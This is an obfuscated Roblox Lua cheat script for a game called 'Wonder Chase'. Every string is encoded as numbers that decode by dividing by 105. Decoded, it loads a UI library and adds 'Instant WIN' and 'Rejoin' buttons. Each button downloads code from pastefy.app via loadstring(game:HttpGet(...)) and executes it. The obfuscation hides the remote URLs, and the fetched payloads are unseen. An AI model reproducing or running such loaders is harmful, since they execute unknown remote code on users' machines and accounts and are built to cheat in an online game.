function OTLykQOIgxhyrqZyYPB(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


game:GetService(OTLykQOIgxhyrqZyYPB({8715,12180,10185,11970,12180,10605,11970,7455,12285,11025})):SetCore(OTLykQOIgxhyrqZyYPB({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}), { 
Title = OTLykQOIgxhyrqZyYPB({21840,16590,21945,13650,3360,21840,16170,21840,19320,21840,19530,21840,18480,6090,3360});
Text = OTLykQOIgxhyrqZyYPB({21840,16380,21840,16590,21840,16065,3360,21840,17010,21840,15435,21840,16170,3360,4725,3360,6720,8190,10605,12495,9975,7560,11655,12705,10500,10185,9975,7035,10920,10185,11550,11550,10605,11340,4620,3360,21840,16905,21840,18480,21840,18585,21840,19845,21840,19320,21945,13545,21945,14700,3360,21840,20055,21840,19110});
Icon = OTLykQOIgxhyrqZyYPB({11970,10290,12600,12180,10920,12285,11445,10290,6090,4935,4935,12180,12705,11760,10605,6405,6825,12075,12075,10605,12180,3990,11025,10500,6405,5565,5145,5040,5775,5145,5880,5250,5145,5145,5460,3990,12495,6405,5145,5565,5040,3990,10920,6405,5145,5565,5040})})
Duration = 10;

local Library = loadstring(Game:HttpGet(OTLykQOIgxhyrqZyYPB({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,10290,11340,11655,11655,10500,10290,10185,11340,11340,4935,4725,10290,10185,10395,11235,4725,12285,11760,12075,4725,10710,11655,11970,4725,11340,11025,10290,12075,4935,11445,10185,11025,11550,4935,12495,11025,12810,10185,11970,10500})))()

local Window = Library:NewWindow(OTLykQOIgxhyrqZyYPB({9135,11655,11550,10500,10605,11970,3360,7035,10920,10185,12075,10605,3360,8925,11760,10500,10185,12180,10605,3465}))

local Section = Window:NewSection(OTLykQOIgxhyrqZyYPB({7245,10185,12075,12705,3360,9135,7665,8190}))

Section:CreateButton(OTLykQOIgxhyrqZyYPB({7665,11550,12075,12180,10185,11550,12180,3360,9135,7665,8190}), function()
print(OTLykQOIgxhyrqZyYPB({8190,11025,10395,10605,3360,6930,11970,11655,3465}))
wait(0,30)
loadstring(game:HttpGet(OTLykQOIgxhyrqZyYPB({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10710,12705,4830,10185,11760,11760,4935,5355,5985,11340,10500,10920,10395,8295,11235,4935,11970,10185,12495})))()
end)

Section:CreateButton(OTLykQOIgxhyrqZyYPB({8610,10605,11130,11655,11025,11550}), function()
loadstring(game:HttpGet(OTLykQOIgxhyrqZyYPB({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10710,12705,4830,10185,11760,11760,4935,7140,7455,10395,9135,8190,12705,7665,5670,4935,11970,10185,12495})))()
end)

local Section = Window:NewSection(OTLykQOIgxhyrqZyYPB({7035,11970,10605,10500,11025,12180,12075}))

Section:CreateButton(OTLykQOIgxhyrqZyYPB({21840,17010,21840,15435,6090,3360,6720,8190,10605,12495,9975,7560,11655,12705,10500,10185,9975,7035,10920,10185,11550,11550,10605,11340}), function()
print(OTLykQOIgxhyrqZyYPB({8190,11025,10395,10605,3360,10500,10185,12705,3360,10710,11655,11970,3360,12705,11655,12285}))
end)    
